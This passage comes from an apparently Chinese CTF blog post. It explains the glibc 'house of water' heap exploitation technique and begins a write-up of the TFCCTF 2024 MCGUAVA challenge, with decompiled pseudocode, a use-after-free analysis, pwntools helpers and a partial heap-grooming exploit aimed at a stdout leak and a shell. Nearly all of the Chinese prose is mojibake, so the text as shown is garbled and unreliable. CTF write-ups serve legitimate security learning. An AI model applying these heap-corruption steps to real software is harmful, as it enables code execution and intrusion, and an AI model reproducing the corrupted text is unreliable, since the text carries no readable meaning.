0x1000ï¼Œåœ¨ bk ä½ç½®å†™ä¸Š 0x20ã€‚</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>è¿™æ ·åšæ˜¯ä¸ºäº†ç»•è¿‡ unsorted binçš„æ£€æµ‹ã€‚æˆ‘ä»¬å›åˆ°æœ€åˆçš„ fake unsorted chunk çš„ä½ç½®ï¼Œå…¶èµ·å§‹åœ°å€ä¸º0x555555559080</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æˆ‘ä»¬éœ€è¦è®©è¿™ä¸ª chunk åœ¨ unsorted bin ä¸­åˆæ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨è®©è¿™æ · fake unsorted chunk åœ¨ç»“æŸçš„æ—¶å€™çš„ä¸‹ä¸ª chunk çš„ prev_size ä¸º 0x10000ï¼Œä¸” size çš„ issue ä½ä¸º 0ï¼ˆå› ä¸º unsorted bin ä¸­çš„å †å—éƒ½æ˜¯å·²ç»é‡Šæ”¾è¿‡çš„æœªä½¿ç”¨çš„ï¼‰<br>æ¥ä¸‹æ¥å°±æ˜¯å¯¹è¿™ä¸ª fake unsorted chunk è¿›è¡Œè£…ä¿®<br>å°†æ–­ç‚¹ä¸‹åœ¨ç¬¬ 57 è¡Œï¼Œæ­¤æ—¶ bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æœŸé—´åšçš„æ“ä½œå°±æ˜¯å°†æœ€å¼€å§‹ç”³è¯·çš„ 7 ä¸ª 0x90 å¤§å°çš„ chunk ç»™é‡Šæ”¾æ‰ï¼ˆå°† size ä¸º 0x90 å¤§å°çš„ tcache é“¾è¡¨ç»™å¡«æ»¡ï¼Œç¡®ä¿åé¢ä¸‰ä¸ª 0x90 å¤§å°çš„å †å—ç»™é‡Šæ”¾åèƒ½å¤Ÿè¿›å…¥åˆ° unsorted binï¼‰ï¼Œç„¶ååœ¨ unsorted_start å’Œ unsorted_end ä¸Šæ–¹åˆ†åˆ«ä¼ªé€ ä¸€ä¸ªå°å †å—ç„¶åé‡Šæ”¾æ‰ï¼Œè¿™é‡Œä¸»è¦è®²è§£ä¸€ä¸‹å †å—çš„ä¼ªé€ <br>å¯¹äº unsorted_start ä¸Šæ–¹å †å—çš„ä¼ªé€ ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ unsorted_start-0x8 çš„åœ°æ–¹å¡«ä¸Š 0x31 æ¥å½“ä½œ fake chunk çš„ size ç„¶åç›´æ¥é‡Šæ”¾ï¼ˆè¿™ä¸ª size æ˜¯æœ‰è®²ç©¶çš„ï¼Œåé¢ä¼šè§£é‡Šåˆ°ï¼‰ï¼Œunstorted_end çš„åšæ³•ä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡ fake chunk çš„å¤§å°ä¸º 0x20ã€‚åœ¨å°† fake chunk ç»™é‡Šæ”¾åç”±äºå †å—è¿›å…¥ tcache é“¾è¡¨å fd+8 çš„åœ°æ–¹ä¼šå¡«ä¸Šä¸€ä¸ª keyï¼Œè¿™ä¸ª key çš„ä½œç”¨æ˜¯ç”¨æ¥æ£€æµ‹ tcache ä¸Šæ˜¯å¦å‡ºç° double freeï¼Œè¿™ä¸ª key çš„å­˜åœ¨ç ´åäº†åŸå…ˆ unsorted_start å’Œ unsorted_end è¿™ 2 ä¸ªå †å—çš„ size ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»™äºˆæ¢å¤ï¼Œç¬¬ 50 å’Œ ç¬¬ 56 è¡Œçš„ä»£ç çš„ä½œç”¨å°±æ˜¯å¦‚æ­¤ã€‚<br>é‚£ä¹ˆä¼ªé€  2 ä¸ª fake chunk ç„¶å é‡Šæ”¾æ‰æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ<br>æˆ‘ä»¬å›åˆ°å‰é¢ï¼Œå‰é¢è¯´è¿‡æ¥ä¸‹æ¥çš„æ“ä½œæ˜¯ä¸ºäº†å¯¹è¦è¿›å…¥ unsorted bin çš„  fake unsorted chunk è¿›è¡Œè£…ä¿®ï¼Œè€Œ unsorted bin æ˜¯å­˜åœ¨ fd å’Œ bk æŒ‡é’ˆçš„ï¼Œæ­¤æ—¶å†æ¥çœ‹çœ‹æˆ‘ä»¬çš„ fake unsorted chunk</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ° fake chunk çš„ fd å’Œ bk å·²ç»ç•™ä¸‹æˆ‘ä»¬å‰é¢ 2 ä¸ªé‡Šæ”¾çš„ fake chunk çš„ data åŒºåŸŸåœ°å€ï¼ŒåŒæ—¶è¿™ä¸ª 2 åœ°å€<br>ä¹Ÿåˆ†åˆ«æ˜¯ unsorted_end å’Œ unsorted_start è¿™ 2 ä¸ªå †å—çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸º 0x555555559090 è¿™ä¸ªåœ°å€ä¸º tcache_perthread_struct ç»“æ„ä½“ entries é“¾è¡¨çš„èµ·å§‹åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯æœ€åè¿›å…¥ 0x20 å¤§å°çš„ tcache é“¾è¡¨çš„å †å—çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬æœ€åé‡Šæ”¾çš„ 2 ä¸ª fake chunk å¤§å°åˆ†åˆ«ä¸º 0x20 å’Œ 0x30ã€‚<br>æˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 63 è¡Œï¼ŒæœŸé—´è¿›è¡Œçš„æ“ä½œä¸ºï¼šä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_startã€‚bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ“ä½œæ˜¯è¦è®©æˆ‘ä»¬ä¸€å¼€å§‹åœ¨ tcache_perthread_struct ä¸­ä¼ªé€ çš„å †å—é“¾å…¥ unsorted binï¼Œè¿™é‡Œçš„æ“ä½œæ˜¯å°† unsorted_middle ç»™æ›¿æ¢ä¸º fake chunkã€‚å›åˆ°æˆ‘ä»¬ fake chunk çš„é‚£å¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° fake chunk çš„fd æŒ‡é’ˆå·²ç»æŒ‡å‘ unsorted_endï¼Œbk æŒ‡é’ˆå·²ç»æŒ‡å‘ unsorted_startï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯ä»¤ unsorted_start çš„ fd æŒ‡é’ˆæŒ‡å‘ fake unsorted chunkï¼Œunsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk å³å¯å®Œæˆ unsorted bin ä¸Šå †å—æ›¿æ¢æ“ä½œ<br>å°†æ–­ç‚¹ä¸‹åœ¨ç¬¬ 67 è¡Œï¼ŒæœŸé—´çš„æ“ä½œå°±æ˜¯è¿›è¡Œä¸Šè¿°çš„æŒ‡é’ˆæ›¿æ¢æ“ä½œï¼Œæœ€åçš„ bin ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå°† unsorted_middle ç»™æ›¿æ¢ä¸º fake chunkã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯è¦è®© fake unsorted chunk çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆå‡ºç° libc çš„åœ°å€ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ª chunk çš„size å°äº 0x10000 ä¸”æ— å¯¹åº” size çš„ chunk åœ¨tcache å’Œå…¶ä»– bin ä¸­æ—¶ï¼Œä¼šå…ˆå¯¹ unsroted bin è¿›è¡Œéå†ï¼Œç„¶å unsorted_end å’Œ unsorted_start é€å…¥ smallbin ä¸­ï¼Œå°† fake chunk é€å…¥ largebin ä¸­ï¼Œæ­¤æ—¶ fake chunk çš„ fd å’Œ bk æŒ‡é’ˆæŒ‡å‘ libc çš„ç›¸å…³åœ°å€ï¼Œæ­¤æ—¶å†åœ¨ fake unsorted chunk ä¸­åˆ‡å‰²å‡ºåˆé€‚å¤§å°çš„å †å—è¿›è¡Œåˆ†é…ã€‚how2heap çš„ä»£ç ä¸­é€‰æ‹©ç”³è¯·çš„å †å—å¤§å°ä¸º 0x290ï¼Œå…¶å®ç”³è¯·çš„å¤§å°æ»¡è¶³æˆ‘ä¸Šé¢æ‰€è¯´çš„æ¡ä»¶å³å¯ã€‚<br>å°†æ–­ç‚¹ä¸‹åˆ° 70 è¡Œï¼Œæ­¤æ—¶å·²ç»å®Œæˆäº†å †å—çš„ç”³è¯·ï¼ŒæŸ¥çœ‹ tcache_perthread_struct ç»“æ„ä½“å’Œ bin çš„ç»“æ„ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å·²ç»ç»™è¸©ä¸Š libc ä¸Šçš„åœ°å€â¬†ï¸</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥è¿›è¡Œ libc ä¸Šå†…å­˜çš„åˆ†é…ï¼Œè¿™ä¹Ÿæ˜¯ house of water çš„æ‰€æœ‰å†…å®¹ï¼Œåç»­çš„æ”»å‡»å°±çœ‹æ¯ä¸ªäººçš„éœ€æ±‚äº†ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å¯ä»¥çœ‹åˆ° house of water èƒ½å¤Ÿåœ¨æ²¡æœ‰å†…å­˜æ³„éœ²çš„æƒ…å†µä¸‹åœ¨ tcache é“¾ä¸Šç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ã€‚åœ¨ä¿®æ”¹ unsorted_start å’Œ unsroted_end çš„æŒ‡é’ˆä½¿ fake unsorted chunk é“¾å…¥unosorted chunk çš„è¿™æ­¥ä¸­æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€æ­¥å°çˆ†ç ´ï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡ä¿®æ”¹ä¸èƒ½åªè¦†ç›–åœ°å€çš„ä½3ä½ï¼Œè€Œæ˜¯ä½4ä½ï¼Œåœ¨å¼€å¯äº† alsr çš„ç¯å¢ƒä¸‹ä»ç¬¬ 4 ä½å¼€å§‹çš„åœ°å€éƒ½æ˜¯éšæœºçš„ã€‚<br>æˆ‘è®¤ä¸º house of water æ”»å‡»çš„å…³é”®æ˜¯ä¼ªé€ å¹¶é‡Šæ”¾é‚£ 2 ä¸ªå¤§å°åˆ†åˆ«ä¸º 0x20 å’Œ 0x30 çš„å †å—ï¼Œæƒ³äº†æƒ³è¿™ä¸ªä¼ªé€ åœ¨ pwn é¢˜ä¸­å¹¶ä¸ç®€å•ã€‚<br>å¸Œæœ›è¯»è€…èƒ½å¤Ÿè‡ªå·±è°ƒè¯•ä¸€é how2heap é‡Œé¢çš„ä»£ç ï¼Œç›¸ä¿¡ä½ ä»¬ä¸€å®šä¼šæœ‰æ–°çš„æ”¶è·ã€‚</p><h2 id="TFCCTF-2024-MCGUAVA"><a href="#TFCCTF-2024-MCGUAVA" class="headerlink" title="TFCCTF 2024 MCGUAVA"></a>TFCCTF 2024 MCGUAVA</h2><p>è¿™é“é¢˜ç›®éœ€è¦ç”¨åˆ° house of waterï¼Œå½“æ—¶å¥½åƒæœ‰ 7 è§£äº†ï¼Œå¯æ˜¯æˆ‘è¿˜æ²¡åšå‡ºæ¥ï¼Œå¤ªèœäº†ğŸ˜­ğŸ˜­ğŸ˜­</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å½“æ—¶çš„æƒ³æ³•æ˜¯è®©åŒä¸€ä¸ª chunk åŒæ—¶è¿›å…¥ unsortedbin å’Œ smallbin ä»¥æ­¤æ¥ç•™ä¸‹ libc çš„åœ°å€ï¼Œå¯æ˜¯æäº†åŠå¤©ä»€ä¹ˆéƒ½æ²¡æå‡ºæ¥ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰å¸ˆå‚…æ˜¯ç”¨è¿™ç§æ–¹æ³•åšå‡ºæ¥çš„ğŸ¤”<br>é¢˜ç›®å¯ä»¥ä» r3kapig æˆ˜é˜Ÿçš„æ¯”èµ›é¢˜åº“ä¸­æ‰¾åˆ°ï¼š<a href="https://r3kapig-not1on.notion.site/TFC-CTF-2024-Jeopardy-bc81d99eb2064c8db48faf5bc5af50ee">TFC CTF 2024(Jeopardy) (notion.site)</a><br>è¿™é¢˜é™„ä»¶é‡Œç»™çš„ dockerfile é‡Œå†™çš„è¿œç¨‹ç¯å¢ƒä¸º ubuntu:24.10ï¼Œæˆ‘å¯»æ€ç€è¿™ä¸ä¹Ÿæ‰ 8 æœˆå˜›ï¼Œæ€ä¹ˆéƒ½æœ‰ 10 äº†ğŸ¤”<br>è¿™é‡Œæˆ‘åšäº†ä¸ªå°å·æ‡’ï¼Œlibc æˆ‘ç”¨äº†æœ¬åœ°çš„ 2.35ï¼Œä¸è¿‡å¤§å·®ä¸å·®ï¼Œæœ€ç»ˆæ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±ä¸€ä¸ªåç§»ä¸åŒè€Œå·²<br>ç”±äºé¢˜ç›®ä»£ç é‡æ¯”è¾ƒå°‘ï¼Œè¿™é‡Œå°±ç›´æ¥è´´ä¸Šæ¥</p><h4 id="idaä¼ªä»£ç "><a href="#idaä¼ªä»£ç " class="headerlink" title="idaä¼ªä»£ç "></a>idaä¼ªä»£ç </h4><p>mainï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    guava_gius[i] = <span class="number">0LL</span>;</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      guava();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      gius();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>guavaï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">guava</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cnt_guavas &gt; <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how many guavas: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1791</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavset: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v2 - <span class="number">2</span> &lt;= v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavas: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4[v3], v2 - v3);</span><br><span class="line">  v0 = cnt_guavas++;</span><br><span class="line">  guava_gius[v0] = v4;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>giusï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gius</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guava no: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)guava_gius[v1]);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„èœå•ç¨‹åºï¼Œå®ç°äº†å †å—çš„ç”³è¯·å’Œé‡Šæ”¾åŠŸèƒ½ï¼Œæ²¡æœ‰ç¼–è¾‘å’Œå’Œæ‰“å°åŠŸèƒ½ã€‚æ¼æ´ååˆ†çš„æ˜æ˜¾ï¼Œå°±æ˜¯ gius åœ¨é‡Šæ”¾å †å—åå¹¶æ²¡æœ‰å°†ç›¸åº”çš„æŒ‡é’ˆç½® 0ï¼Œè¿™é‡Œå­˜åœ¨ UAF æ¼æ´ã€‚ç¨‹åºæœ€å¤šå¯ä»¥ç”³è¯· 0x100 ä¸ªå †å—ï¼Œæ¯ä¸ªå †å—æœ€å¤§ä¸º 0x1791ï¼Œè¿™ä¸æ‘†æ˜ç€è®©æˆ‘ä»¬ä½¿ç”¨ house of water è¿›è¡Œæ”»å‡»å˜›ï¼ŸğŸ˜‡<br>è¿™é‡Œå…ˆè´´ä¸Šæˆ‘çš„äº¤äº’è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬çš„æ•´ç†æ€è·¯æ˜¯åˆ©ç”¨ house of water å®ç° stdout ä¸Šçš„å†…å­˜åˆ†é…ï¼Œç„¶åé€šè¿‡ stdout æ³„éœ²å‡º libc çš„åœ°å€ï¼Œæœ€åé€šè¿‡ä¼ªé€  io file æ¥ getshellã€‚<br>æ—¢ç„¶ä¸Šé¢è¯´åˆ° house of water çš„å…³é”®æ˜¯ä¼ªé€  unsorted_start å’Œ unsroted_end ä¸Šæ–¹çš„2ä¸ªå°å †å—ï¼Œè¿™é‡Œå°±å…ˆè¿›è¡Œè¿™ä¸€æ­¥ï¼Œå·²ç» unsorted_start ä¸ºä¾‹</p><h4 id="è·å–å †å—ç´¢å¼•"><a href="#è·å–å †å—ç´¢å¼•" class="headerlink" title="è·å–å †å—ç´¢å¼•"></a>è·å–å †å—ç´¢å¼•</h4><p>å› ä¸ºæˆ‘ä»¬çš„å° fake chunk å’Œ unsorted_start æœ€ç»ˆéƒ½æ˜¯è¦ç»™ free æ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆè·å¾—ä»–çš„ç´¢å¼•ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯å †å—åˆ‡å‰²æ³•ï¼Œé€šè¿‡è®©ä¸€ä¸ªå·¨å¤§çš„å †å—è¿›å…¥ unsorted binï¼Œç„¶åæŒ‰ç…§ä¸€å®šçš„å¤§å°ç”³è¯· 2 ä¸ªå †å—å‡ºæ¥è·å–ç´¢å¼•ï¼Œç„¶åå†å°†ç”³è¯·å‡ºæ¥çš„å †å—é‡Šæ”¾æ‰ï¼Œä½¿å…¶å†æ¬¡å’Œåˆå¹¶è¿›å…¥ unsorted binï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¸€å…±ç”³è¯·äº† 4 ä¸ªå¤§å †å—ï¼Œå…¶ä¸­ç¬¬ 4 ä¸ªå †å—æ˜¯ç”¨äºé˜²æ­¢ unsorted bin ä¸ top chunk 